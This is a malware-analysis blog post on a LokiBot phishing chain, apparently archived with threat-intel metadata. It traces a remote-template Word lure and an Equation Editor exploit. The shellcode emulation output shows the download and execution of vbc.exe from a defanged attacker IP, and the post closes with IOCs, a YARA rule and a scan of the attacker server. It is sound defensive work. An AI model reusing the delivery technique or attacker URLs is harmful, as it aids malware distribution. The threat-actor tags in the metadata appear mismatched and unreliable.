{
    "id": "e4d55aed-d0ea-4b40-9f60-e00d3fd7d5e8",
    "created_at": "2023-01-12T15:02:20.412685Z",
    "updated_at": "2025-03-27T02:16:25.918056Z",
    "deleted_at": null,
    "sha1_hash": "77ffc390c576b4b5d65155d9f53d20cd9315e53d",
    "title": "2022-08-05 - LokiBot Analysis",
    "authors": "",
    "file_creation_date": "2022-09-01T10:09:23Z",
    "file_modification_date": "2022-09-01T10:09:23Z",
    "file_size": 750579,
    "plain_text": "# LokiBot Analysis\n\n**ivanvza.github.io/posts/lokibot_analysis**\n\n#### Aug 5, 2022\n\n## Brief Introduction\n\n\nAugust 5, 2022\n\n\n#### The initial delivery was via email, however this post is about analyzing the delivery stages, malware and some SECOPS fails from the LokiBot threat actors.\n\n The high level killchain is as follows:\n\n 1. Spam/Phishing email 2. Contains a malicious document 3. Downloads a remote template 4. Exploits Equation Editor vulnerability 5. Drops LokiBot.\n\n\n-----\n\n## Step 1. Extract the attachment from the email\n\n#### I don’t want to go into too much detail however it is simple, extract the attachment from the email, I want to mention how to do this for that one reader that might not know :)\n\n Somewhere in the mail headers you will see something like this:\n```\n<snip>\n\n--=_992495f41efb31bdba85371179868e6e\n\nContent-Transfer-Encoding: base64\n\nContent-Type: application/vnd.openxmlformatsofficedocument.wordprocessingml.document;\n\n name=\"Payment advice_1.docx\"\n\nContent-Disposition: attachment; filename=\"Payment advice_1.docx\"; size=73762\n\nUEsDBBQAAgAIAHJ1/FRtFkuTcAEAAL8FAAATABEAW0NvbnRlbnRfVHlwZXNdLnhtbFVUDQAHnaDi\n\nYp2g4mKdoOJitZTLbsIwEEX3lfoPkbdVYuiiqioCiz6WLVLpB5h4Alb9kse8/r5jXqoQJGqBTaJk\n\n5t57JrGmN1ganc0hoHK2ZN2iwzKwlZPKTkr2NXrLH1mGUVgptLNQshUgG/Rvb3qjlQfMSG2xZNMY\n\n/RPnWE3BCCycB0uV2gUjIj2GCfei+hYT4PedzgOvnI1gYx6TB+v3XqAWMx2z1yW93pCAqVn2vOlL\n\nUSVTJumXearwo5oAGg9EwnutKhGpzudWHpDlW6qClOsenCqPd9RwIiFVTgc06DQu/0bm6lpVIF01\n\n<snip>\n\nAQAAAA==\n\n--=_992495f41efb31bdba85371179868e6e-\n As you can see this is generally Base64 encoded, between 2 The Multipart Content-Type headers, we can easily extract the attachment by doing something like this:\ncat Email\\ Header.txt| awk '/Content-Disposition:/,/--=_/' | tail -n +2 | tail -r |\ntail -n +2 | tail -r | base64 -d > loki_attachment.docx\n\n To explain what is happening here:\n\n 1. Printing the entire output to stdout 2. With AWK, we are grabbing the contents between Content-Disposition: and -   =_\n\n 3. tail -f +2 cuts the last line off, which is the trailing --=_ 4. Reverse the entire order of the output (a little cheat to cut the top part) 5. Doing some more cutting to, and then reversing it again to get the output back in the\n same order as originally 6. Decrypting the base64 content and then piping it into our .docx file.\n\n## Step 2. Diving into the initial document\n\n#### So I use a Docker container from Remnux, which comes pre-installed and configured with a bunch of tools for our analysis.\n\n Here is an alias I use in my .zshrc to spin this container up and mapping my current folder as a volume:\n\n```\n\n-----\n\n```\nalias docker_RE docker run rm it u remnux v $PWD:/home/remnux/files \nremnux/remnux-distro:focal bash'\n\n#### We are going to use oleid to see if the document is encrypted, has VBA Macros / XLM Macros or External Relationships embedded.\n\n The oletools suite is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis and debugging.\n$ oleid loki_attachment.docx\n\nFilename: loki_attachment.docx\n\n--------------------+--------------------+----------+-------------------------\nIndicator      |Value        |Risk   |Description\n\n--------------------+--------------------+----------+-------------------------\nFile format     |MS Word 2007+    |info   |\n\n          |Document (.docx)  |     |\n\n--------------------+--------------------+----------+-------------------------\nContainer format  |OpenXML       |info   |Container type\n\n--------------------+--------------------+----------+-------------------------\nEncrypted      |False        |none   |The file is not encrypted\n\n--------------------+--------------------+----------+-------------------------\nVBA Macros     |No         |none   |This file does not contain\n\n          |          |     |VBA macros.\n\n--------------------+--------------------+----------+-------------------------\nXLM Macros     |No         |none   |This file does not contain\n\n          |          |     |Excel 4/XLM macros.\n\n--------------------+--------------------+----------+-------------------------\nExternal      |1          |HIGH   |External relationships\n\nRelationships    |          |     |found: attachedTemplate \n          |          |     |use oleobj for details\n\n--------------------+--------------------+----------+-------------------------\n With the above output we can see that there is indeed an external relationship, which means that the word document downloads a remote template.\n\n### Why this technique?\n\n#### The advantage of this technique is that the actual decoy Word document that touches the disk of the victim and read is not malicious. Thus, the chances of the attachment bypassing Email Gateways and/or host AV/EDR solutions increases than the traditional malicious Word Document.\n\n Let’s extract the remote template URL with oleobj\n\n```\n\n-----\n\n```\n$ oleobj loki_attachment.docx\n\n------------------------------------------------------------------------------\nFile: 'loki_attachment.docx'\n\nFound relationship 'attachedTemplate' with external link\nhxxp://192[.]3[.]122[.]162/receipt/doc_50.doc\n\n## Step 3. Diving into the second document (Template)\n$ oleid doc_50.doc\n\nXLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use\nMS Excel)\n\noleid 0.60.1 - http://decalage.info/oletools\n\nTHIS IS WORK IN PROGRESS - Check updates regularly!\n\nPlease report any issue at https://github.com/decalage2/oletools/issues\n\nFilename: doc_50.doc\n\n--------------------+--------------------+----------+-------------------------\nIndicator      |Value        |Risk   |Description\n\n--------------------+--------------------+----------+-------------------------\nFile format     |Rich Text Format  |info   |\n\n--------------------+--------------------+----------+-------------------------\nContainer format  |RTF         |info   |Container type\n\n--------------------+--------------------+----------+-------------------------\nEncrypted      |False        |none   |The file is not encrypted\n\n--------------------+--------------------+----------+-------------------------\nVBA Macros     |No         |none   |RTF files cannot contain\n\n          |          |     |VBA macros\n\n--------------------+--------------------+----------+-------------------------\nXLM Macros     |No         |none   |RTF files cannot contain\n\n          |          |     |XLM macros\n\n--------------------+--------------------+----------+-------------------------\nExternal      |0          |none   |External relationships\n\nRelationships    |          |     |such as remote templates,\n\n          |          |     |remote OLE objects, etc\n\n--------------------+--------------------+----------+-------------------------\n\n#### A lot of malicious RTF files are obfuscated. With this sample rtfobj or rtfdump could not handle properly to correctly identify OLE objects (“Not a well-formed OLE object”). But the rtfdump tool has an option that can help decode objects that are not well-formed.\n\n Let’s take a closer look, rtfdump does not identify OLE objects in this sample, however, the\nh= indicator tells us that there are a lot of hexadecimal characters, the interesting level we\n\n will look into is Level 3, reason for that is it is the inner most nested object with 15545 hex characters. We can always look at the other objects when we don’t find something.\n\n```\n\n-----\n\n```\n$ rtfdump.py doc_50.doc\n\n  1 Level 1    c=  1 p=00000000 l=  20542 h=  8457;   18 b=    0 \nu=  4064 \\rt\n\n  2 Level 2    c=  1 p=00001312 l=  15659 h=  7383;   18 b=    0 \nu=   260 \\object51717743\n\n  3  Level 3   c=  5 p=00001383 l=  15545 h=  7383;   18 b=    0 \nu=   260 \\*\\objdata141307\n\n  4  Level 4   c=  1 p=00001395 l=   151 h=   26;   18 b=    0 \nu=   53\n\n  5   Level 5  c=  1 p=00001396 l=   149 h=   26;   18 b=    0 \nu=   53\n\n  6   Level 6  c=  1 p=00001397 l=   147 h=   26;   18 b=    0 \nu=   53 \\bin00\n\n  7    Level 7 c=  0 p=000013a1 l=   19 h=    0;    0 b=    0 \nu=    0 \\*\\objdata141307\n\n  8  Level 4   c=  1 p=0000142f l=   56 h=   18;   18 b=    0 \nu=    0\n\n  9   Level 5  c=  1 p=00001430 l=   54 h=   18;   18 b=    0 \nu=    0\n\n  10   Level 6  c=  0 p=00001431 l=   52 h=   18;   18 b=    0 \nu=    0 \\*\\nonsartlrun221714552\n\n  11  Level 4   c=  1 p=0000146a l=   390 h=   73;    6 b=    0 \nu=   169\n\n  12   Level 5  c=  1 p=0000146b l=   388 h=   73;    6 b=    0 \nu=   169\n\n  13   Level 6  c=  0 p=0000146c l=   386 h=   125;    6 b=    0 \nu=   256 \\*\\ho\n\n  14  Level 4   c=  1 p=00001644 l=   181 h=    0;   12 b=    0 \nu=    0 \\object\n\n  15   Level 5  c=  0 p=000016b5 l=   67 h=    0;    8 b=    0 \nu=    0\n\n  16  Level 4   c=  1 p=00001769 l=   82 h=   22;   12 b=    0 \nu=   37\n\n  17   Level 5  c=  1 p=0000176a l=   80 h=   22;   12 b=    0 \nu=   37\n\n  18   Level 6  c=  0 p=0000176b l=   78 h=   22;    7 b=    0 \nu=   37 \\emspace610134477\n\n#### a quick breakdown of the below command is as follows:\n-s3: select item nr for dumping, in our case Level 3\n\n-H: decode hexadecimal data\n\n```\n\n-----\n\n```\n$ rtfdump.py s3 H doc_50.doc\n\n<snip>\n\n00000460: FF FF FF F5 20 06 F0 06 F0 07 40 02 00 04 50 06 .... .....@...P.\n\n00000470: E0 07 40 07 20 07 90 00 00 00 00 00 00 00 00 00 ..@. ...........\n\n00000480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n00000490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n000004A0: 00 00 00 01 60 00 50 0F FF FF FF FF FF FF FF F0 ....`.P.........\n\n000004B0: 10 00 00 00 2C E0 20 00 00 00 00 0C 00 00 00 00 ....,. .........\n\n000004C0: 00 00 04 60 00 00 00 00 00 00 00 00 00 00 00 07 ...`............\n\n000004D0: 0F 26 9F 51 6A 7D 80 10 30 00 00 08 00 50 00 00 .&.Qj}..0....P..\n\n000004E0: 00 00 00 00 10 04 F0 06 C0 04 50 03 10 03 00 06 ..........P.....\n\n000004F0: E0 06 10 05 40 06 90 05 60 06 50 00 00 00 00 00 ....@...`.P.....\n\n</snip>\n\n#### I want to focus on the following lines, executing this command just showed a bunch of blob, nothing is readable, and left me going back to rtfdump’s documents trying to figure out why it can’t properly decode these hex values.\n\n The word hexshift caught my eye, the parameter in rtfdump is --hexshift shift one\nnibble, which made so much sense, let’s execute the same command with the hexshift and\n\n look at the output and also draw it out:\n$ rtfdump.py -s3 -S -H doc_50.doc\n\n<snip>\n\n00000460: FF FF FF FF 52 00 6F 00 6F 00 74 00 20 00 45 00 ....R.o.o.t. .E.\n\n00000470: 6E 00 74 00 72 00 79 00 00 00 00 00 00 00 00 00 n.t.r.y.........\n\n00000480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n00000490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n000004A0: 00 00 00 00 16 00 05 00 FF FF FF FF FF FF FF FF ................\n\n000004B0: 01 00 00 00 02 CE 02 00 00 00 00 00 C0 00 00 00 ................\n\n000004C0: 00 00 00 46 00 00 00 00 00 00 00 00 00 00 00 00 ...F............\n\n000004D0: 70 F2 69 F5 16 A7 D8 01 03 00 00 00 80 05 00 00 p.i.............\n\n000004E0: 00 00 00 00 01 00 4F 00 6C 00 45 00 31 00 30 00 ......O.l.E.1.0.\n\n000004F0: 6E 00 61 00 54 00 69 00 56 00 65 00 00 00 00 00 n.a.T.i.V.e.....\n\n</snip>\n\n We actually have something readable.\n\n### So what does shift one nibble mean?\n00000460: FF FF FF F5 20 06 F0 06 F0 07 40 02 00 04 50 06 .... .....@...P.\n\n          |\n\n           _ < Shift one nibble to the left\n\n           |\n\n00000460: FF FF FF FF 52 00 6F 00 6F 00 74 00 20 00 45 00 ....R.o.o.t. .E.\n\n\n#### So with the nibble shifting in play, let’s dump that section and also dump it in raw format using the -d parameter:\n$ rtfdump.py -s3 -S -H doc_50.doc -d > s3_doc_50.dump\n\n```\n\n-----\n\n```\n$ oledump.py s3_doc_50.dump\n\nError: s3_doc_50.dump is not a valid OLE file.\n\n### Why is that?\n\n#### Let’s go back to the dump:\n$ rtfdump.py -s3 -S -H doc_50.doc\n\n<snip>\n\n00000060: 00 0E 00 00 D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 ................\n\n</snip>\n\n the bytes D0 CF 11 E0 (remember these magic bytes when analyzing documents) match the signature of a valid OLE file, well, Compound File Binary Format to be more accurate.\n\n To extract from the COM object header onward, we can do the following:\n$ rtfdump.py -s3 -S -H doc_50.doc -c 0x64: | head -n3\n\n00000000: D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 00 00 00 00 ................\n\n00000010: 00 00 00 00 00 00 00 00 3E 00 03 00 FE FF 09 00 ........>.......\n\n00000020: 06 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 ................\n\n$ rtfdump.py -s3 -S -H doc_50.doc -c 0x64: -d > s3_doc_50.dump\n\n$ oledump.py s3_doc_50.dump\n\n 1:   1354 '\\x01OlE10naTiVe'\n\n\n### Another way to obtain this with oledump\n$ rtfdump.py -s3 -S -H doc_50.doc -d > s3_doc_50.dump\n\n$ oledump.py --find=1 s3_doc_50.dump\n\n 1:   1354 '\\x01OlE10naTiVe'\n\n$ oledump.py --find=1 s3_doc_50.dump -sa | head -n3\n\n00000000: 32 C7 FD 04 02 CB 4B BD 52 0B 01 08 7F 95 BD D6 2.....K.R.......\n\n00000010: 42 BA FF F7 D5 8B 7D 13 8B 0F BB 30 E0 4F 90 81 B.....}....0.O..\n\n00000020: EB 80 78 09 90 8B 03 51 FF D0 05 62 0B 0E FA 2D ..x....Q...b...\n$ oledump.py --find=1 s3_doc_50.dump -sa -d > raw_oleobj.dump\n\n\n#### I was about to mention that LokiBot makes use of CVE-2017-11882, but there is another tool from oletools called oledir, which displays all the directory entries of an OLE file. However this CLSID 0002CE02-0000-0000-C000-000000000046 is a clear giveaway of this CVE being at play here.\n\n```\n\n-----\n\n```\n$ oledir s3_doc_50.dump\n\noledir 0.54 - http://decalage.info/python/oletools\n\nOLE directory entries in file s3_doc_50.dump:\n\n----+------+-------+----------------------+-----+-----+-----+--------+-----\nid |Status|Type  |Name         |Left |Right|Child|1st Sect|Size\n\n----+------+-------+----------------------+-----+-----+-----+--------+-----\n0  |<Used>|Root  |Root Entry      |-  |-  |1  |3    |1408\n\n1  |<Used>|Stream |\\x01OlE10naTiVe    |-  |-  |-  |0    |1354\n\n2  |unused|Empty |           |-  |-  |-  |0    |0\n\n3  |unused|Empty |           |-  |-  |-  |0    |0\n\n----+----------------------------+------+-------------------------------------\nid |Name            |Size |CLSID\n\n----+----------------------------+------+-------------------------------------\n0  |Root Entry         |-   |0002CE02-0000-0000-C000-000000000046\n\n  |              |   |Microsoft Equation 3.0 (Known Related\n\n  |              |   |to CVE-2017-11882 or CVE-2018-0802)\n\n1  |\\x01OlE10naTiVe       |1354 |\n\n## Detecting the shellcode\n\n#### For doing this let’s make use of a tool called scdbgc, a brief explanation of that the tool is:\n\n scdbg is a shellcode analysis application built around the libemu emulation library.\n\n Basically it analyzes shellcode by emulating its execution. You have 2 versions of this tool, scdbgc is the commandline equivalent of scdbg.\n\n So we will use 2 parameters with scdbgc:\n/f fpath load shellcode from file - accepts binary, %u, \\x, %x, hex blob\n\n/findsc  detect possible shellcode buffers (brute force) (supports -dump, -disasm)\n\n```\n\n-----\n\n```\n$ scdbgc /f s3_doc_50.dump findsc\n\nLoaded e08 bytes from file s3_doc_50.dump\n\nTesting 3592 offsets | Percent Complete: 99% | Completed in 1014 ms\n\n0) offset=0x8a5    steps=MAX  final_eip=7c80ae40  GetProcAddress\n\n1) offset=0x925    steps=MAX  final_eip=7c80ae40  GetProcAddress\n\n2) offset=0xaf9    steps=MAX  final_eip=401b0b\n\n3) offset=0xafb    steps=MAX  final_eip=401b0b\n\nSelect index to execute:: (int/reg) 0\n\n0\n\nLoaded e08 bytes from file s3_doc_50.dump\n\nInitialization Complete..\n\nMax Steps: 2000000\n\nUsing base offset: 0x401000\n\nExecution starts at file offset 8a5\n\n4018a5 EB7E              jmp 0x401925 vv\n\n4018a7 8D9397020000          lea edx,[ebx+0x297]\n\n4018ad 6BF600             imul esi,esi,0x0\n\n4018b0 90               nop\n\n4018b1 EB08              jmp 0x4018bb vv\n\n\n401b2f GetProcAddress(ExpandEnvironmentStringsW)\n\n401b62 ExpandEnvironmentStringsW(%PUBLIC%\\vbc.exe, dst=12fb9c, sz=104)\n\n401b77 LoadLibraryW(UrlMon)\n\n401b92 GetProcAddress(URLDownloadToFileW)\n\n401be4 URLDownloadToFileW(hxxp://192[.]3[.]122[.]162/57/vbc.exe,\nC:\\users\\Public\\vbc.exe)\n\n401c2c LoadLibraryW(shell32)\n\n401c44 GetProcAddress(ShellExecuteExW)\n\n401c4c unhooked call to shell32.ShellExecuteExW step=45299\n\nStepcount 45299\n\n#### So let’s break down what happened here, thanks to the tool doing most of the hard work here:\n\n 1. We loaded the shellcode from the dump file 2. We used the /findsc parameter to detect possible shellcode buffers. 3. The /findsc parameter is a brute force search for shellcode buffers. 4. It lists all possible shellcode buffers and their offsets. 5. We selected the first one, which is the one we want because the tool is nice enough to\n say it has an opcode relevant to GetProcAddress 6. Selected and, and scdbgc loaded the shellcode and emulated it’s execution which gave\n us the URL we were after.\n\n If you know the offset you can simply supply it with the /foff to specify the offset:\n\n```\n\n-----\n\n```\n$ scdbgc /f s3_doc_50.dump foff 0x8a5\n\n<snip>\n\n4018a5 EB7E              jmp 0x401925 vv\n\n4018a7 8D9397020000          lea edx,[ebx+0x297]\n\n4018ad 6BF600             imul esi,esi,0x0\n\n4018b0 90               nop\n\n4018b1 EB08              jmp 0x4018bb vv\n\n\n401b2f GetProcAddress(ExpandEnvironmentStringsW)\n\n401b62 ExpandEnvironmentStringsW(%PUBLIC%\\vbc.exe, dst=12fb9c, sz=104)\n\n401b77 LoadLibraryW(UrlMon)\n\n401b92 GetProcAddress(URLDownloadToFileW)\n\n401be4 URLDownloadToFileW(hxxp://192[.]3[.]122[.]162/57/vbc.exe, %PUBLIC%\\vbc.exe)\n\n401c2c LoadLibraryW(shell32)\n\n401c44 GetProcAddress(ShellExecuteExW)\n\n401c4c unhooked call to shell32.ShellExecuteExW step=45299\n\n</snip>\n\n## Step 4. Diving into LokiBot (vpc.exe)\n\n#### I’ll cover this in more detail in the future, as this part was pretty lengthy, I found several different types of malware being deployed from the same source. (e.g. Formbook, LokiBot, etc)\n\n But not to leave anyone hanging, here is a little tool from FireEye called (CAPA)\n [https://github.com/mandiant/capa], it detects capabilities in executable files or even shellcode.\n\n```\n\n-----\n\n```\n$ capa vbc.exe\n\n+------------------------+-----------------------------------------------------------------------------------+\n\n| md5          | e31ec73d7d7dfa46d8389c1f0b3c92ae             \n|\n\n| sha1          | 9ae8bcc139898d5a31c5fb966ab05eaf65504401         \n|\n\n| sha256         |\ne736ecdc420334831835e97a58ef4d512be477f6c9803e17caae4e47381e0991          |\n\n| os           | windows                          \n|\n\n| format         | pe                            \n|\n\n| arch          | i386                           \n|\n\n| path          | vbc.exe                          \n|\n\n+------------------------+-----------------------------------------------------------------------------------+\n\n+------------------------+-----------------------------------------------------------------------------------+\n\n| ATT&CK Tactic     | ATT&CK Technique                     \n|\n\n|------------------------+-----------------------------------------------------------------------------------|\n\n| DEFENSE EVASION    | Reflective Code Loading T1620               \n|\n\n| DISCOVERY       | System Location Discovery T1614              \n|\n\n+------------------------+-----------------------------------------------------------------------------------+\n\n\n+------------------------------------------------------+-----------------------------------------------------+\n\n| CAPABILITY                      | NAMESPACE          \n|\n\n|------------------------------------------------------+-----------------------------------------------------|\n\n| get geographical location              | collection         \n|\n\n| load .NET assembly                  | load-code/dotnet      \n|\n\n| unmanaged call                    | runtime           \n|\n\n| compiled to the .NET platform            | runtime/dotnet       \n|\n\n+------------------------------------------------------+-----------------------------------------------------+\n\n## Step 5 Let’s build some automated detection\n\n```\n\n-----\n\n### IOC\n\n#### Indicator Type\n\n vbc.exe Filename\n\n shp_58.doc Filename\n\n shp_57.doc Filename\n\n 14a477e0c37e60760bb806304fcdf37b MD5\n\n 1cb3e5b0031ef252187c1615c3f7e8db MD5\n\n 4d52c7446dda5cb8eb465d1902fa4fc3 MD5\n\n 89a8308ac9c48817acce539db7e1b45f MD5\n\n add40f2ec9ffce439f8e35e3bc1509cf MD5\n\n e31ec73d7d7dfa46d8389c1f0b3c92ae MD5\n\n 12c635ac85b1ced4805c4bc679cf18a169d33619 SHA1\n\n 475fd526221b1731323fc5c9a732f2d87329ec89 SHA1\n\n 7cfa51cec50f5eaebc12bdf7b0c2b066f021edba SHA1\n\n 9ae8bcc139898d5a31c5fb966ab05eaf65504401 SHA1\n\n c8b45087429c162b0cc514fae47bb3f871c1c61f SHA1\n\n cc8958899f6433a6e5e8124901ecccc5fb838012 SHA1\n\n 3074b2ea06a803ab002e0bee1adc9b08dd62731563e3026b5db226367b7a44ab SHA256\n\n 890c61f9b56ab414f1729bfba7aa223cc1439c0c23778432807ce13c39250ef0 SHA256\n\n 8fd93f5dc3041c50e1a6910aae03f95a22e632952ec987447859bec00bd31fa2 SHA256\n\n be7dcfaf22adad3a7bc430046446d6a76e55ca1e00266e41710e7185f751da26 SHA256\n\n d82d9f74c7d1b768a2c170b47117222fdf81a2aaae69ac2c61e893e94524c424 SHA256\n\n e736ecdc420334831835e97a58ef4d512be477f6c9803e17caae4e47381e0991 SHA256\n\n hxxp://192[.]3[.]122[.]162/57/vbc[.]exe URL\n\n hxxp://192[.]3[.]122[.]162/ships/shp_58[.]doc URL\n\n hxxp://192[.]3[.]122[.]162/ships/shp_57[.]doc URL\n\n\n-----\n\n#### Indicator Type\n\n hxxp://192[.]3[.]122[.]162/58/vbc[.]exe UR\n\n### Yara Rules\n\n#### I thought I’ll do something different a try, I’ve always thought about automated YARA rule generation and how feasible it can be in this field, I found this amazing tool on Github called yarGen, basically you give it the stuff you want YARA rules generated for and it does some magic. Here is a summary from the developer:\n\n The main principle is the creation of yara rules from strings found in malware files while removing all strings that also appear in goodware files. Therefore yarGen includes a big goodware strings and opcode database as ZIP archives that have to be extracted before the first use.\n\n Quick installation:\n```\ngit clone https://github.com/Neo23x0/yarGen.git\n\npip install -r requirements.txt\n\npython3 yarGen.py --update\n\n Let’s look at the results:\n$ python3 yarGen.py --opcodes -m ~/files\n\n<snip>\n\n[+] Processing PEStudio strings ...\n\n[+] Reading goodware strings from database 'good-strings.db' ...\n\n<snip>\n\n[+] Generating Super Rules ...\n\n[=] Generated 11 SIMPLE rules.\n\n[=] Generated 7 SUPER rules.\n\n[=] All rules written to yargen_rules.yar\n\n[+] yarGen run finished\n\n</snip>\n\n I must say the results are pretty good, it even combines multiple files of the same type to create one big rule if you desire, here is an example of one of the rules:\n\n```\n\n-----\n\n```\nrule _vbc_vbc_22_vbc_57_vbc_58_0 {\n\n  meta:\n\n   description = \"raw_files - from files vbc.exe, vbc_22.exe, vbc_57.exe,\nvbc_58.exe\"\n\n   author = \"yarGen Rule Generator\"\n\n   reference = \"https://github.com/Neo23x0/yarGen\"\n\n   date = \"2022-08-05\"\n\n   hash1 = \"e736ecdc420334831835e97a58ef4d512be477f6c9803e17caae4e47381e0991\"\n\n   hash2 = \"d82d9f74c7d1b768a2c170b47117222fdf81a2aaae69ac2c61e893e94524c424\"\n\n   hash3 = \"8fd93f5dc3041c50e1a6910aae03f95a22e632952ec987447859bec00bd31fa2\"\n\n   hash4 = \"3074b2ea06a803ab002e0bee1adc9b08dd62731563e3026b5db226367b7a44ab\"\n\n  strings:\n\n   $s1 = \"lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0,\nCulture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R\" ascii\n\n   $s2 = \"UE 3J:\\\"\" fullword ascii\n\n   $s3 = \"16.0.0.0\" fullword ascii\n\n   $s4 = \"c%s8u -Ld\" fullword ascii\n\n   $s5 = \"w -|/$)\" fullword ascii\n\n   $s6 = \"TripleDESCryptoServiceProvider\" fullword ascii /* Goodware String occured 36 times */\n\n   $s7 = \"MD5CryptoServiceProvider\" fullword ascii /* Goodware String - occured 50\ntimes */\n\n   $s8 = \"CipherMode\" fullword ascii /* Goodware String - occured 54 times */\n\n   $s9 = \"CreateDecryptor\" fullword ascii /* Goodware String - occured 76 times */\n\n   $s10 = \"ComputeHash\" fullword ascii /* Goodware String - occured 226 times */\n\n   $s11 = \"System.Security.Cryptography\" fullword ascii /* Goodware String occured 305 times */\n\n   $s12 = \"<Sshu%xf\" fullword ascii\n\n   $s13 = \"untimeResourceSet\" fullword ascii\n\n   $s14 = \"vfRfy<M\" fullword ascii\n\n   $s15 = \"SkTZk@a8\" fullword ascii\n\n   $s16 = \"IVow\\\\B\" fullword ascii\n\n   $s17 = \"_PFgN>NJ\" fullword ascii\n\n   $s18 = \"/u.low\" fullword ascii\n\n   $s19 = \"System.Runtime.CompilerServices\" fullword ascii /* Goodware String occured 1950 times */\n\n   $s20 = \"b77a5c561934e089\" ascii /* Goodware String - occured 2 times */\n\n   $op0 = { ff 25 00 20 40 00 48 34 46 5a 54 47 43 58 38 37 }\n\n   $op1 = { 08 00 00 11 00 03 2c 0b 02 7b 34 00 00 04 14 fe }\n\n   $op2 = { 81 00 cb 23 06 00 34 00 98 89 }\n\n  condition:\n\n   ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them ) and all of ($op*)\n\n   ) or ( all of them )\n\n}\n\n#### Let’s quickly testing out if the rules work, I have a docker-based version of yara installed, so I can run the rules against a sample file:\n$ yara /malware/yarGen/test_sample.yar -r /malware/raw_files\n\n_vbc_vbc_22_vbc_57_vbc_58_0 /malware/raw_files/vbc_58.exe\n\n```\n\n-----\n\n#### As you can see it did indeed match with the given sample, pretty neat, I also tested with the other automated rules and it worked better than expected. If anyone is keen, drop me a message on Twitter and I will showcase how to build this into your automated static analysis process.\n\n## Step 6. Bloopers\n\n#### I’m still in awe how bad the infrastructure is of the Threat Actor, running outdated, unpatched, unhardened applications. But I’m assuming it was all due to a quick and dirty win, regardless of what the outcomes were, they can just spin up more&mldr; Change their A records and continue moving.\n\n Anyway, just take a look at this snippet of their web directory structure, I didn’t include most of it because it’s besides the point, but as you can see the IoC’s we’re after was just waiting there, no attempt to even host it on a another server, this whole campeign was done on a single host.\n```\n$ docker_dirb -u hxxp://192[.]3[.]122[.]162                 1 ↵\n<snip>\n\nFile found: /21/vbc.exe - 200\n\nFile found: /22/vbc.exe - 200\n\nFile found: /57/vbc.exe - 200\n\nFile found: /58/vbc.exe - 200\n\nDir found: /dashboard/ - 200\n\nFile found: /dashboard/phpinfo.php - 200\n\nDir found: /phpmyadmin/ - 403\n\nDir found: /webalizer/ - 403\n\nDir found: /ships/ - 200\n\nFile found: /ships/shp_57.doc - 200\n\nFile found: /ships/shp_58.doc - 200\n\nDir found: /xampp/ - 200\n\n</snip>\n\n Here are some more unhardened things that was open from the outside :\n\n```\n\n-----\n\n```\nNumber of open ports:  7\n\nVulnerabilities:     CVE-2022-2097 CVE-2022-1292 CVE-2022-26377 CVE-202230522 CVE-2022-28614 CVE-2022-2068 CVE-2022-29404 CVE-2022-31813 CVE-202228615 CVE-2022-30556 CVE-2022-28330\n\nPorts:\n\n   80/tcp Apache httpd (2.4.53)\n\n  135/tcp Microsoft RPC Endpoint Mapper\n\n  139/tcp\n\n  443/tcp Apache httpd (2.4.53)\n\n     |-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3\n\n     |-- Diffie-Hellman Parameters:\n\n          Bits:     1024\n\n          Generator:   2\n\n          Fingerprint:  RFC2409/Oakley Group 2\n\n  445/tcp\n\n     |-- SMB Status:\n\n          Authentication: enabled\n\n          SMB Version: 1\n\n          OS: Windows Server 2016 Standard 14393\n\n          Software: Windows Server 2016 Standard 6.3\n\n          Capabilities: extended-security, infolevel-passthru, large-files,\nlarge-readx, large-writex, level2-oplocks, lock-and-read, lwio, nt-find, nt-smb, ntstatus, rpc-remote-api, unicode\n\n  3306/tcp\n\n  3389/tcp Remote Desktop Protocol\n\n     |-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2\n\n     |-- Diffie-Hellman Parameters:\n\n          Bits:     2048\n\n          Generator:  \n00000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-05 - LokiBot Analysis.pdf"
    ],
    "report_names": [
        "2022-08-05 - LokiBot Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535740,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1662026963,
    "ts_modification_date": 1662026963,
    "files": {
        "pdf": "https://archive.orkl.eu/77ffc390c576b4b5d65155d9f53d20cd9315e53d.pdf",
        "text": "https://archive.orkl.eu/77ffc390c576b4b5d65155d9f53d20cd9315e53d.txt",
